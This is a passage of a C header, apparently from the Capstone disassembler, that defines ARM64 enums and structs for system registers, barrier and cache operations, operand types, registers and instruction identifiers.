	ARM64_SYSREG_OSLAR_EL1         = 0x8084, // 10  000  0001  0000  100
	ARM64_SYSREG_PMSWINC_EL0       = 0xdce4,  // 11  011  1001  1100  100

	// Trace Registers
	ARM64_SYSREG_TRCOSLAR          = 0x8884, // 10  001  0001  0000  100
	ARM64_SYSREG_TRCLAR            = 0x8be6, // 10  001  0111  1100  110

	// GICv3 registers
	ARM64_SYSREG_ICC_EOIR1_EL1     = 0xc661, // 11  000  1100  1100  001
	ARM64_SYSREG_ICC_EOIR0_EL1     = 0xc641, // 11  000  1100  1000  001
	ARM64_SYSREG_ICC_DIR_EL1       = 0xc659, // 11  000  1100  1011  001
	ARM64_SYSREG_ICC_SGI1R_EL1     = 0xc65d, // 11  000  1100  1011  101
	ARM64_SYSREG_ICC_ASGI1R_EL1    = 0xc65e, // 11  000  1100  1011  110
	ARM64_SYSREG_ICC_SGI0R_EL1     = 0xc65f, // 11  000  1100  1011  111
} arm64_msr_reg;

//> System PState Field (MSR instruction)
typedef enum arm64_pstate {
	ARM64_PSTATE_INVALID = 0,
	ARM64_PSTATE_SPSEL = 0x05,
	ARM64_PSTATE_DAIFSET = 0x1e,
	ARM64_PSTATE_DAIFCLR = 0x1f
} arm64_pstate;

//> Vector arrangement specifier (for FloatingPoint/Advanced SIMD insn)
typedef enum arm64_vas {
	ARM64_VAS_INVALID = 0,
	ARM64_VAS_8B,
	ARM64_VAS_16B,
	ARM64_VAS_4H,
	ARM64_VAS_8H,
	ARM64_VAS_2S,
	ARM64_VAS_4S,
	ARM64_VAS_1D,
	ARM64_VAS_2D,
	ARM64_VAS_1Q,
} arm64_vas;

//> Vector element size specifier
typedef enum arm64_vess {
	ARM64_VESS_INVALID = 0,
	ARM64_VESS_B,
	ARM64_VESS_H,
	ARM64_VESS_S,
	ARM64_VESS_D,
} arm64_vess;

//> Memory barrier operands
typedef enum arm64_barrier_op {
	ARM64_BARRIER_INVALID = 0,
	ARM64_BARRIER_OSHLD = 0x1,
	ARM64_BARRIER_OSHST = 0x2,
	ARM64_BARRIER_OSH =   0x3,
	ARM64_BARRIER_NSHLD = 0x5,
	ARM64_BARRIER_NSHST = 0x6,
	ARM64_BARRIER_NSH =   0x7,
	ARM64_BARRIER_ISHLD = 0x9,
	ARM64_BARRIER_ISHST = 0xa,
	ARM64_BARRIER_ISH =   0xb,
	ARM64_BARRIER_LD =    0xd,
	ARM64_BARRIER_ST =    0xe,
	ARM64_BARRIER_SY =    0xf
} arm64_barrier_op;

//> Operand type for instruction's operands
typedef enum arm64_op_type {
	ARM64_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	ARM64_OP_REG, // = CS_OP_REG (Register operand).
	ARM64_OP_IMM, // = CS_OP_IMM (Immediate operand).
	ARM64_OP_MEM, // = CS_OP_MEM (Memory operand).
	ARM64_OP_FP,  // = CS_OP_FP (Floating-Point operand).
	ARM64_OP_CIMM = 64, // C-Immediate
	ARM64_OP_REG_MRS, // MRS register operand.
	ARM64_OP_REG_MSR, // MSR register operand.
	ARM64_OP_PSTATE, // PState operand.
	ARM64_OP_SYS, // SYS operand for IC/DC/AT/TLBI instructions.
	ARM64_OP_PREFETCH, // Prefetch operand (PRFM).
	ARM64_OP_BARRIER, // Memory barrier operand (ISB/DMB/DSB instructions).
} arm64_op_type;

//> TLBI operations
typedef enum arm64_tlbi_op {
	ARM64_TLBI_INVALID = 0,
	ARM64_TLBI_VMALLE1IS,
	ARM64_TLBI_VAE1IS,
	ARM64_TLBI_ASIDE1IS,
	ARM64_TLBI_VAAE1IS,
	ARM64_TLBI_VALE1IS,
	ARM64_TLBI_VAALE1IS,
	ARM64_TLBI_ALLE2IS,
	ARM64_TLBI_VAE2IS,
	ARM64_TLBI_ALLE1IS,
	ARM64_TLBI_VALE2IS,
	ARM64_TLBI_VMALLS12E1IS,
	ARM64_TLBI_ALLE3IS,
	ARM64_TLBI_VAE3IS,
	ARM64_TLBI_VALE3IS,
	ARM64_TLBI_IPAS2E1IS,
	ARM64_TLBI_IPAS2LE1IS,
	ARM64_TLBI_IPAS2E1,
	ARM64_TLBI_IPAS2LE1,
	ARM64_TLBI_VMALLE1,
	ARM64_TLBI_VAE1,
	ARM64_TLBI_ASIDE1,
	ARM64_TLBI_VAAE1,
	ARM64_TLBI_VALE1,
	ARM64_TLBI_VAALE1,
	ARM64_TLBI_ALLE2,
	ARM64_TLBI_VAE2,
	ARM64_TLBI_ALLE1,
	ARM64_TLBI_VALE2,
	ARM64_TLBI_VMALLS12E1,
	ARM64_TLBI_ALLE3,
	ARM64_TLBI_VAE3,
	ARM64_TLBI_VALE3,
} arm64_tlbi_op;

//> AT operations
typedef enum arm64_at_op {
	ARM64_AT_S1E1R,
	ARM64_AT_S1E1W,
	ARM64_AT_S1E0R,
	ARM64_AT_S1E0W,
	ARM64_AT_S1E2R,
	ARM64_AT_S1E2W,
	ARM64_AT_S12E1R,
	ARM64_AT_S12E1W,
	ARM64_AT_S12E0R,
	ARM64_AT_S12E0W,
	ARM64_AT_S1E3R,
	ARM64_AT_S1E3W,
} arm64_at_op;

//> DC operations
typedef enum arm64_dc_op {
	ARM64_DC_INVALID = 0,
	ARM64_DC_ZVA,
	ARM64_DC_IVAC,
	ARM64_DC_ISW,
	ARM64_DC_CVAC,
	ARM64_DC_CSW,
	ARM64_DC_CVAU,
	ARM64_DC_CIVAC,
	ARM64_DC_CISW,
} arm64_dc_op;

//> IC operations
typedef enum arm64_ic_op {
	ARM64_IC_INVALID = 0,
	ARM64_IC_IALLUIS,
	ARM64_IC_IALLU,
	ARM64_IC_IVAU,
} arm64_ic_op;

//> Prefetch operations (PRFM)
typedef enum arm64_prefetch_op {
	ARM64_PRFM_INVALID = 0,
	ARM64_PRFM_PLDL1KEEP = 0x00 + 1,
	ARM64_PRFM_PLDL1STRM = 0x01 + 1,
	ARM64_PRFM_PLDL2KEEP = 0x02 + 1,
	ARM64_PRFM_PLDL2STRM = 0x03 + 1,
	ARM64_PRFM_PLDL3KEEP = 0x04 + 1,
	ARM64_PRFM_PLDL3STRM = 0x05 + 1,
	ARM64_PRFM_PLIL1KEEP = 0x08 + 1,
	ARM64_PRFM_PLIL1STRM = 0x09 + 1,
	ARM64_PRFM_PLIL2KEEP = 0x0a + 1,
	ARM64_PRFM_PLIL2STRM = 0x0b + 1,
	ARM64_PRFM_PLIL3KEEP = 0x0c + 1,
	ARM64_PRFM_PLIL3STRM = 0x0d + 1,
	ARM64_PRFM_PSTL1KEEP = 0x10 + 1,
	ARM64_PRFM_PSTL1STRM = 0x11 + 1,
	ARM64_PRFM_PSTL2KEEP = 0x12 + 1,
	ARM64_PRFM_PSTL2STRM = 0x13 + 1,
	ARM64_PRFM_PSTL3KEEP = 0x14 + 1,
	ARM64_PRFM_PSTL3STRM = 0x15 + 1,
} arm64_prefetch_op;

// Instruction's operand referring to memory
// This is associated with ARM64_OP_MEM operand type above
typedef struct arm64_op_mem {
	unsigned int base;	// base register
	unsigned int index;	// index register
	int32_t disp;	// displacement/offset value
} arm64_op_mem;

// Instruction operand
typedef struct cs_arm64_op {
	int vector_index;	// Vector Index for some vector operands (or -1 if irrelevant)
	arm64_vas vas;		// Vector Arrangement Specifier
	arm64_vess vess;	// Vector Element Size Specifier
	struct {
		arm64_shifter type;	// shifter type of this operand
		unsigned int value;	// shifter value of this operand
	} shift;
	arm64_extender ext;		// extender type of this operand
	arm64_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int64_t imm;		// immediate value, or index for C-IMM or IMM operand
		double fp;			// floating point value for FP operand
		arm64_op_mem mem;		// base/index/scale/disp value for MEM operand
		arm64_pstate pstate;		// PState field of MSR instruction.
		unsigned int sys;  // IC/DC/AT/TLBI operation (see arm64_ic_op, arm64_dc_op, arm64_at_op, arm64_tlbi_op)
		arm64_prefetch_op prefetch;  // PRFM operation.
		arm64_barrier_op barrier;  // Memory barrier operation (ISB/DMB/DSB instructions).
	};
} cs_arm64_op;

// Instruction structure
typedef struct cs_arm64 {
	arm64_cc cc;	// conditional code for this insn
	bool update_flags;	// does this insn update flags?
	bool writeback;	// does this insn request writeback? 'True' means 'yes'

	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;

	cs_arm64_op operands[8]; // operands for this instruction.
} cs_arm64;

//> ARM64 registers
typedef enum arm64_reg {
	ARM64_REG_INVALID = 0,

	ARM64_REG_X29,
	ARM64_REG_X30,
	ARM64_REG_NZCV,
	ARM64_REG_SP,
	ARM64_REG_WSP,
	ARM64_REG_WZR,
	ARM64_REG_XZR,
	ARM64_REG_B0,
	ARM64_REG_B1,
	ARM64_REG_B2,
	ARM64_REG_B3,
	ARM64_REG_B4,
	ARM64_REG_B5,
	ARM64_REG_B6,
	ARM64_REG_B7,
	ARM64_REG_B8,
	ARM64_REG_B9,
	ARM64_REG_B10,
	ARM64_REG_B11,
	ARM64_REG_B12,
	ARM64_REG_B13,
	ARM64_REG_B14,
	ARM64_REG_B15,
	ARM64_REG_B16,
	ARM64_REG_B17,
	ARM64_REG_B18,
	ARM64_REG_B19,
	ARM64_REG_B20,
	ARM64_REG_B21,
	ARM64_REG_B22,
	ARM64_REG_B23,
	ARM64_REG_B24,
	ARM64_REG_B25,
	ARM64_REG_B26,
	ARM64_REG_B27,
	ARM64_REG_B28,
	ARM64_REG_B29,
	ARM64_REG_B30,
	ARM64_REG_B31,
	ARM64_REG_D0,
	ARM64_REG_D1,
	ARM64_REG_D2,
	ARM64_REG_D3,
	ARM64_REG_D4,
	ARM64_REG_D5,
	ARM64_REG_D6,
	ARM64_REG_D7,
	ARM64_REG_D8,
	ARM64_REG_D9,
	ARM64_REG_D10,
	ARM64_REG_D11,
	ARM64_REG_D12,
	ARM64_REG_D13,
	ARM64_REG_D14,
	ARM64_REG_D15,
	ARM64_REG_D16,
	ARM64_REG_D17,
	ARM64_REG_D18,
	ARM64_REG_D19,
	ARM64_REG_D20,
	ARM64_REG_D21,
	ARM64_REG_D22,
	ARM64_REG_D23,
	ARM64_REG_D24,
	ARM64_REG_D25,
	ARM64_REG_D26,
	ARM64_REG_D27,
	ARM64_REG_D28,
	ARM64_REG_D29,
	ARM64_REG_D30,
	ARM64_REG_D31,
	ARM64_REG_H0,
	ARM64_REG_H1,
	ARM64_REG_H2,
	ARM64_REG_H3,
	ARM64_REG_H4,
	ARM64_REG_H5,
	ARM64_REG_H6,
	ARM64_REG_H7,
	ARM64_REG_H8,
	ARM64_REG_H9,
	ARM64_REG_H10,
	ARM64_REG_H11,
	ARM64_REG_H12,
	ARM64_REG_H13,
	ARM64_REG_H14,
	ARM64_REG_H15,
	ARM64_REG_H16,
	ARM64_REG_H17,
	ARM64_REG_H18,
	ARM64_REG_H19,
	ARM64_REG_H20,
	ARM64_REG_H21,
	ARM64_REG_H22,
	ARM64_REG_H23,
	ARM64_REG_H24,
	ARM64_REG_H25,
	ARM64_REG_H26,
	ARM64_REG_H27,
	ARM64_REG_H28,
	ARM64_REG_H29,
	ARM64_REG_H30,
	ARM64_REG_H31,
	ARM64_REG_Q0,
	ARM64_REG_Q1,
	ARM64_REG_Q2,
	ARM64_REG_Q3,
	ARM64_REG_Q4,
	ARM64_REG_Q5,
	ARM64_REG_Q6,
	ARM64_REG_Q7,
	ARM64_REG_Q8,
	ARM64_REG_Q9,
	ARM64_REG_Q10,
	ARM64_REG_Q11,
	ARM64_REG_Q12,
	ARM64_REG_Q13,
	ARM64_REG_Q14,
	ARM64_REG_Q15,
	ARM64_REG_Q16,
	ARM64_REG_Q17,
	ARM64_REG_Q18,
	ARM64_REG_Q19,
	ARM64_REG_Q20,
	ARM64_REG_Q21,
	ARM64_REG_Q22,
	ARM64_REG_Q23,
	ARM64_REG_Q24,
	ARM64_REG_Q25,
	ARM64_REG_Q26,
	ARM64_REG_Q27,
	ARM64_REG_Q28,
	ARM64_REG_Q29,
	ARM64_REG_Q30,
	ARM64_REG_Q31,
	ARM64_REG_S0,
	ARM64_REG_S1,
	ARM64_REG_S2,
	ARM64_REG_S3,
	ARM64_REG_S4,
	ARM64_REG_S5,
	ARM64_REG_S6,
	ARM64_REG_S7,
	ARM64_REG_S8,
	ARM64_REG_S9,
	ARM64_REG_S10,
	ARM64_REG_S11,
	ARM64_REG_S12,
	ARM64_REG_S13,
	ARM64_REG_S14,
	ARM64_REG_S15,
	ARM64_REG_S16,
	ARM64_REG_S17,
	ARM64_REG_S18,
	ARM64_REG_S19,
	ARM64_REG_S20,
	ARM64_REG_S21,
	ARM64_REG_S22,
	ARM64_REG_S23,
	ARM64_REG_S24,
	ARM64_REG_S25,
	ARM64_REG_S26,
	ARM64_REG_S27,
	ARM64_REG_S28,
	ARM64_REG_S29,
	ARM64_REG_S30,
	ARM64_REG_S31,
	ARM64_REG_W0,
	ARM64_REG_W1,
	ARM64_REG_W2,
	ARM64_REG_W3,
	ARM64_REG_W4,
	ARM64_REG_W5,
	ARM64_REG_W6,
	ARM64_REG_W7,
	ARM64_REG_W8,
	ARM64_REG_W9,
	ARM64_REG_W10,
	ARM64_REG_W11,
	ARM64_REG_W12,
	ARM64_REG_W13,
	ARM64_REG_W14,
	ARM64_REG_W15,
	ARM64_REG_W16,
	ARM64_REG_W17,
	ARM64_REG_W18,
	ARM64_REG_W19,
	ARM64_REG_W20,
	ARM64_REG_W21,
	ARM64_REG_W22,
	ARM64_REG_W23,
	ARM64_REG_W24,
	ARM64_REG_W25,
	ARM64_REG_W26,
	ARM64_REG_W27,
	ARM64_REG_W28,
	ARM64_REG_W29,
	ARM64_REG_W30,
	ARM64_REG_X0,
	ARM64_REG_X1,
	ARM64_REG_X2,
	ARM64_REG_X3,
	ARM64_REG_X4,
	ARM64_REG_X5,
	ARM64_REG_X6,
	ARM64_REG_X7,
	ARM64_REG_X8,
	ARM64_REG_X9,
	ARM64_REG_X10,
	ARM64_REG_X11,
	ARM64_REG_X12,
	ARM64_REG_X13,
	ARM64_REG_X14,
	ARM64_REG_X15,
	ARM64_REG_X16,
	ARM64_REG_X17,
	ARM64_REG_X18,
	ARM64_REG_X19,
	ARM64_REG_X20,
	ARM64_REG_X21,
	ARM64_REG_X22,
	ARM64_REG_X23,
	ARM64_REG_X24,
	ARM64_REG_X25,
	ARM64_REG_X26,
	ARM64_REG_X27,
	ARM64_REG_X28,

	ARM64_REG_V0,
	ARM64_REG_V1,
	ARM64_REG_V2,
	ARM64_REG_V3,
	ARM64_REG_V4,
	ARM64_REG_V5,
	ARM64_REG_V6,
	ARM64_REG_V7,
	ARM64_REG_V8,
	ARM64_REG_V9,
	ARM64_REG_V10,
	ARM64_REG_V11,
	ARM64_REG_V12,
	ARM64_REG_V13,
	ARM64_REG_V14,
	ARM64_REG_V15,
	ARM64_REG_V16,
	ARM64_REG_V17,
	ARM64_REG_V18,
	ARM64_REG_V19,
	ARM64_REG_V20,
	ARM64_REG_V21,
	ARM64_REG_V22,
	ARM64_REG_V23,
	ARM64_REG_V24,
	ARM64_REG_V25,
	ARM64_REG_V26,
	ARM64_REG_V27,
	ARM64_REG_V28,
	ARM64_REG_V29,
	ARM64_REG_V30,
	ARM64_REG_V31,

	ARM64_REG_ENDING,		// <-- mark the end of the list of registers

	//> alias registers

	ARM64_REG_IP1 = ARM64_REG_X16,
	ARM64_REG_IP0 = ARM64_REG_X17,
	ARM64_REG_FP = ARM64_REG_X29,
	ARM64_REG_LR = ARM64_REG_X30,
} arm64_reg;

//> ARM64 instruction
typedef enum arm64_insn {
	ARM64_INS_INVALID = 0,

	ARM64_INS_ABS,
	ARM64_INS_ADC,
	ARM64_INS_ADDHN,
	ARM64_INS_ADDHN2,
	ARM64_INS_ADDP,
	ARM64_INS_ADD,
	ARM64_INS_ADDV,
	ARM64_INS_ADR,
	ARM64_INS_ADRP,
	ARM64_INS_AESD,
	ARM64_INS_AESE,
	ARM64_INS_AESIMC,
	ARM64_INS_AESMC,
	ARM64_INS_AND,
	ARM64_INS_ASR,
	ARM64_INS_B,
	ARM64_INS_BFM,
	ARM64_INS_BIC,
	ARM64_INS_BIF,
	ARM64_INS_BIT,
	ARM64_INS_BL,
	ARM64_INS_BLR,
	ARM64_INS_BR,
	ARM64_INS_BRK,
	ARM64_INS_BSL,
	ARM64_INS_CBNZ,
	ARM64_INS_CBZ,
	ARM64_INS_CCMN,
	ARM64_INS_CCMP,
	ARM64_INS_CLREX,
	ARM64_INS_CLS,
	ARM64_INS_CLZ,
	ARM64_INS_CMEQ,
	ARM64_INS_CMGE,
	ARM64_INS_CMGT,
	ARM64_INS_CMHI,
	ARM64_INS_CMHS,
	ARM64_INS_CMLE,
	ARM64_INS_CMLT,
	ARM64_INS_CMTST,
	ARM64_INS_CNT,
	ARM64_INS_MOV,
	ARM64_INS_CRC32B,
	ARM64_INS_CRC32CB,
	ARM64_INS_CRC32CH,
	ARM64_INS_CRC32CW,
	ARM64_INS_CRC32CX,
	ARM64_INS_CRC32H,
	ARM64_INS_CRC32W,
	ARM64_INS_CRC32X,
	ARM64_INS_CSEL,
	ARM64_INS_CSINC,
	ARM64_INS_CSINV,
	ARM64_INS_CSNEG,
	ARM64_INS_DCPS1,
	ARM64_INS_DCPS2,
	ARM64_INS_DCPS3,
	ARM64_INS_DMB,
	ARM64_INS_DRPS,
	ARM64_INS_DSB,
	ARM64_INS_DUP,
	ARM64_INS_EON,
	ARM64_INS_EOR,
	ARM64_INS_ERET,
	ARM64_INS_EXTR,
	ARM64_INS_EXT,
	ARM64_INS_FABD,
	ARM64_INS_FABS,
	ARM64_INS_FACGE,
	ARM64_INS_FACGT,
	ARM64_INS_FADD,
	ARM64_INS_FADDP,
	ARM64_INS_FCCMP,
	ARM64_INS_FCCMPE,
	ARM64_INS_FCMEQ,
	ARM64_INS_FCMGE,
	ARM64_INS_FCMGT,
	ARM64_INS_FCMLE,
	ARM64_INS_FCMLT,
	ARM64_INS_FCMP,
	ARM64_INS_FCMPE,
	ARM64_INS_FCSEL,
	ARM64_INS_FCVTAS,
	ARM64_INS_FCVTAU,
	ARM64_INS_FCVT,
	ARM64_INS_FCVTL,
	ARM64_INS_FCVTL2,
	ARM64_INS_FCVTMS,
	ARM64_INS_FCVTMU,
	ARM64_INS_FCVTNS,
	ARM64_INS_FCVTNU,
	ARM64_INS_FCVTN,
	ARM64_INS_FCVTN2,
	ARM64_INS_FCVTPS,
	ARM64_INS_FCVTPU,
	ARM64_INS_FCVTXN,
	ARM64_INS_FCVTXN2,
	ARM64_INS_FCVTZS,
	ARM64_INS_FCVTZU,
	ARM64_INS_FDIV,
	ARM64_INS_FMADD,
	ARM64_INS_FMAX,
	ARM64_INS_FMAXNM,
	ARM64_INS_FMAXNMP,
	ARM64_INS_FMAXNMV,
	ARM64_INS_FMAXP,
	ARM64_INS_FMAXV,
	ARM64_INS_FMIN,
	ARM64_INS_FMINNM,
	ARM64_INS_FMINNMP,
	ARM64_INS_FMINNMV,
	ARM64_INS_FMINP,
	ARM64_INS_FMINV,
	ARM64_INS_FMLA,
	ARM64_INS_FMLS,
	ARM64_INS_FMOV,
	ARM64_INS_FMSUB,
	ARM64_INS_FMUL,
	ARM64_INS_FMULX,
	ARM64_INS_FNEG,
	ARM64_INS_FNMADD,
	ARM64_INS_FNMSUB,
	ARM64_INS_FNMUL,
	ARM64_INS_FRECPE,
	ARM64_INS_FRECPS,
	ARM64_INS_FRECPX,
	ARM64_INS_FRINTA,
	ARM64_INS_FRINTI,
	ARM64_INS_FRINTM,
	ARM64_INS_FRINTN,
	ARM64_INS_FRINTP,
	ARM64_INS_FRINTX,
	ARM64_INS_FRINTZ,
	ARM64_INS_FRSQRTE,
	ARM64_INS_FRSQRTS,
	ARM64_INS_FSQRT,
	ARM64_INS_FSUB,
	ARM64_INS_HINT,
	ARM64_INS_HLT,
	ARM64_INS_HVC,
	ARM64_INS_INS,

	ARM64_INS_ISB,
	ARM64_INS_LD1,
	ARM64_INS_LD1R,
	ARM64_INS_LD2R,
	ARM64_INS_LD2,
	ARM64_INS_LD3R,
	ARM64_INS_LD3,
	ARM64_INS_LD4,
	ARM64_INS_LD4R,

	ARM64_INS_LDARB,
	ARM64_INS_LDARH,
	ARM64_INS_LDAR,
	ARM64_INS_LDAXP,
	ARM64_INS_LDAXRB,
	ARM64_INS_LDAXRH,
	ARM64_INS_LDAXR,
	ARM64_INS_LDNP,
	ARM64_INS_LDP,
	ARM64_INS_LDPSW,
	ARM64_INS_LDRB,
	ARM64_INS_LDR,
	ARM64_INS_LDRH,
	ARM64_INS_LDRSB,
	ARM64_INS_LDRSH,
	ARM64_INS_LDRSW,
	ARM64_INS_LDTRB,
	ARM64_INS_LDTRH,
	ARM64_INS_LDTRSB,

	ARM64_INS_LDTRSH,
	ARM64_INS_LDTRSW,
	ARM64_INS_LDTR,
	ARM64_INS_LDURB,
	ARM64_INS_LDUR,
	ARM64_INS_LDURH,
	ARM64_INS_LDURSB,
	ARM64_INS_LDURSH,
	ARM64_INS_LDURSW,
	ARM64_INS_LDXP,
	ARM64_INS_LDXRB,
	ARM64_INS_LDXRH,
	ARM64_INS_LDXR,
	ARM64_INS_LSL,
	ARM64_INS_LSR,
	ARM64_INS_MADD,
	ARM64_INS_MLA,
	ARM64_INS_MLS,
	ARM64_INS_MOVI,
	ARM64_INS_MOVK,
	ARM64_INS_MOVN,
	ARM64_INS_MOVZ,
	ARM64_INS_MRS,
	ARM64_INS_MSR,
	ARM64_INS_MSUB,
	ARM64_INS_MUL,
	ARM64_INS_MVNI,
	ARM64_INS_NEG,
	ARM64_INS_NOT,
	ARM64_INS_ORN,
	ARM64_INS_ORR,
	ARM64_INS_PMULL2,
	ARM64_INS_PMULL,
	ARM64_INS_PMUL,
	ARM64_INS_PRFM,
	ARM64_INS_PRFUM,
	ARM64_INS_RADDHN,
	ARM64_INS_RADDHN2,
	ARM64_INS_RBIT,
	ARM64_INS_RET,
	ARM64_INS_REV16,
	ARM64_INS_REV32,
	ARM64_INS_REV64,
	ARM64_INS_REV,
	ARM64_INS_ROR,
	ARM64_INS_RSHRN2,
	ARM64_INS_RSHRN,
	ARM64_INS_RSUBHN,
	ARM64_INS_RSUBHN2,
	ARM64_INS_SABAL2,
	ARM64_INS_SABAL,

	ARM64_INS_SABA,
	ARM64_INS_SABDL2,
	ARM64_INS_SABDL,
	ARM64_INS_SABD,
	ARM64_INS_SADALP,
	ARM64_INS_SADDLP,
	ARM64_INS_SADDLV,
	ARM64_INS_SADDL2,
	ARM64_INS_SADDL,
	ARM64_INS_SADDW2,
	ARM64_INS_SADDW,
	ARM64_INS_SBC,
	ARM64_INS_SBFM,
	ARM64_INS_SCVTF,
	ARM64_INS_SDIV,
	ARM64_INS_SHA1C,
	ARM64_INS_SHA1H,
	ARM64_INS_SHA1M,
	ARM64_INS_SHA1P,
	ARM64_INS_SHA1SU0,
	ARM64_INS_SHA1SU1,
	ARM64_INS_SHA256H2,
	ARM64_INS_SHA256H,
	ARM64_INS_SHA256SU0,
	ARM64_INS_SHA256SU1,
	ARM64_INS_SHADD,
	ARM64_INS_SHLL2,
	ARM64_INS_SHLL,
	ARM64_INS_SHL,
	ARM64_INS_SHRN2,
	ARM64_INS_SHRN,
	ARM64_INS_SHSUB,
	ARM64_INS_SLI,
	ARM64_INS_SMADDL,
	ARM64_INS_SMAXP,
	ARM64_INS_SMAXV,
	ARM64_INS_SMAX,
	ARM64_INS_SMC,
	ARM64_INS_SMINP,
	ARM64_INS_SMINV,
	ARM64_INS_SMIN,
	ARM64_INS_SMLAL2,
	ARM64_INS_SMLAL,
	ARM64_INS_SMLSL2,
	ARM64_INS_SMLSL,
	ARM64_INS_SMOV,
	ARM64_INS_SMSUBL,
	ARM64_INS_SMULH,
	ARM64_INS_SMULL2,
	ARM64_INS_SMULL,
	ARM64_INS_SQABS,
	ARM64_INS_SQADD,
	ARM64_INS_SQDMLAL,
	ARM64_INS_SQDMLAL2,
	ARM64_INS_SQDMLSL,
	ARM64_INS_SQDMLSL2,
	ARM64_INS_SQDMULH,
	ARM64_INS_SQDMULL,
	ARM64_INS_SQDMULL2,
	ARM64_INS_SQNEG,
	ARM64_INS_SQRDMULH,
	ARM64_INS_SQRSHL,
	ARM64_INS_SQRSHRN,
	ARM64_INS_SQRSHRN2,
	ARM64_INS_SQRSHRUN,
	ARM64_INS_SQRSHRUN2,
	ARM64_INS_SQSHLU,
	ARM64_INS_SQSHL,
	ARM64_INS_SQSHRN,
	ARM64_INS_SQSHRN2,
	ARM64_INS_SQSHRUN,
	ARM64_INS_SQSHRUN2,
	ARM64_INS_SQSUB,
	ARM64_INS_SQXTN2,
	ARM64_INS_SQXTN,
	ARM64_INS_SQXTUN2,
	ARM64_INS_SQXTUN,
	ARM64_INS_SRHADD,
	ARM64_INS_SRI,
	ARM64_INS_SRSHL,
	ARM64_INS_SRSHR,
	ARM64_INS_SRSRA,
	ARM64_INS_SSHLL2,
	ARM64_INS_SSHLL,
	ARM64_INS_SSHL,
	ARM64_INS_SSHR,
	ARM64_INS_SSRA,
	ARM64_INS_SSUBL2,
	ARM64_INS_SSUBL,
	ARM64_INS_SSUBW2,
	ARM64_INS_SSUBW,
	ARM64_INS_ST1,
	ARM64_INS_ST2,
	ARM64_INS_ST3,
	ARM64_INS_ST4,
	ARM64_INS_STLRB,
	ARM64_INS_STLRH,
	ARM64_INS_STLR,
	ARM64_INS_STLXP,
	ARM64_INS_STLXRB,
	ARM64_INS_STLXRH,
	ARM64_INS_STLXR,
	ARM64_INS_STNP,
	ARM64_INS_STP,
	ARM64_INS_STRB,
	ARM64_INS_STR,
	ARM64_INS_STRH,
	ARM64_INS_STTRB,
	ARM64_INS_STTRH,
	ARM64_INS_STTR,
	ARM64_INS_STURB,
	ARM64_INS_STUR,
	ARM64_INS_STURH,
	ARM64_INS_STXP,
	ARM64_INS_STXRB,
	ARM64_INS_STXRH,
	ARM64_INS_STXR,
	ARM64_INS_SUBHN,
	ARM64_INS_SUBHN2,
	ARM64_INS_SUB,
	ARM64_INS_SUQADD,
	ARM64_INS_SVC,
	ARM64_INS_SYSL,
	ARM64_INS_SYS,
	ARM64_INS_TBL,
	ARM64_INS_TBNZ,
	ARM64_INS_TBX,
	ARM64_INS_TBZ,
	ARM64_INS_TRN1,
	ARM64_INS_TRN2,
	ARM64_INS_UABAL2,
	ARM64_INS_UABAL,
	ARM64_INS_UABA,
	ARM64_INS_UABDL2,
	ARM64_INS_UABDL,
	ARM64_INS_UABD,
	ARM64_INS_UADALP,
	ARM64_INS_UADDLP,
	ARM64_INS_UADDLV,
	ARM64_INS_UADDL2,
	ARM64_INS_UADDL,
	ARM64_INS_UADDW2,
	ARM64_INS_UADDW,
	ARM64_INS_UBFM,
	ARM64_INS_UCVTF,
	ARM64_INS_UDIV,
	ARM64_INS_UHADD,
	ARM64_INS_UHSUB,
	ARM64_INS_UMADDL,
	ARM64_INS_UMAXP,
	ARM64_INS_UMAXV,
	ARM64_INS_UMAX,
	ARM64_INS_UMINP,
	ARM64_INS_UMINV,
	ARM64_INS_UMIN,
	ARM64_INS_UMLAL2,
	ARM64_INS_UMLAL,
	ARM64_INS_UMLSL2,
	ARM64_INS_UMLSL,
	ARM64_INS_UMOV,
	ARM64_INS_UMSUBL,
	ARM64_INS_UMULH,
	ARM64_INS_UMULL2,
	ARM64_INS_UMULL,
	ARM64_INS_UQADD,
	ARM64_INS_UQRSHL,
	ARM64_INS_UQRSHRN,
	ARM64_INS_UQRSHRN2,
	ARM64_INS_UQSHL,
	ARM64_INS_UQSHRN,
	ARM64_INS_UQSHRN2,
	ARM64_INS_UQSUB,
	ARM64_INS_UQXTN2,
	ARM64_INS_UQXTN,
	ARM64_INS_URECPE,
	ARM64_INS_URHADD,
	ARM64_INS_URSHL,
	ARM64_INS_URSHR,
	ARM64_INS_URSQRTE,
	ARM64_INS_URSRA,
	ARM64_INS_USHLL2,
	ARM64_INS_USHLL,
	ARM64_INS_USHL,
	ARM64_INS_USHR,
	ARM64_INS_USQADD,
	ARM64_INS_USRA,
	ARM64_INS_USUBL2,
	ARM64_INS_USUBL,
	ARM64_INS_USUBW2,
	ARM64_INS_USUBW,
	ARM64_INS_UZP1,
	ARM64_INS_UZP2,
	ARM64_INS_XTN2,
	ARM64_INS_XTN,
	ARM64_INS_ZIP1,
	ARM64_INS_ZIP2,

	// alias insn
	ARM64_INS_MNEG,
	ARM64_INS_UMNEGL,
	ARM64_INS_SMNEGL,
	ARM64_INS_NOP,
	ARM64_INS_YIELD,
	ARM64_INS_WFE,
	ARM64_INS_WFI,
	ARM64_INS_SEV,
	ARM64_INS_SEVL,
	ARM64_INS_NGC,
	ARM64_INS_SBFIZ,
	ARM64_INS_UBFIZ,
	ARM64_INS_SBFX,
	ARM64_INS_UBFX,
	ARM64_INS_BFI,
	ARM64_INS_BFXIL,
	ARM64_INS_CMN,
	ARM64_INS_MVN,
	ARM64_INS_TST,
	ARM64_INS_CSET,
	ARM64_INS_CINC,
	ARM64_INS_CSETM,
	ARM64_INS_CINV,
	ARM64_INS_CNEG,
	ARM64_INS_SXTB,
	ARM64_INS_SXTH,
	ARM64_INS_SXTW,
	ARM64_INS_CMP,
	ARM64_INS_UXTB,
	ARM64_INS_UXTH,
	ARM64_INS_UXTW,
	ARM64_INS_IC,
	ARM64_INS_DC,
	ARM64_INS_AT,
	ARM64_INS_TLBI,

	ARM64_INS_ENDING,  // <-- mark the end of the list of insn
} arm64_insn;

//> Group of ARM64 instructions
typedef enum arm64_insn_group {
	ARM64_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	ARM64_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	ARM64_GRP_CRYPTO = 128,
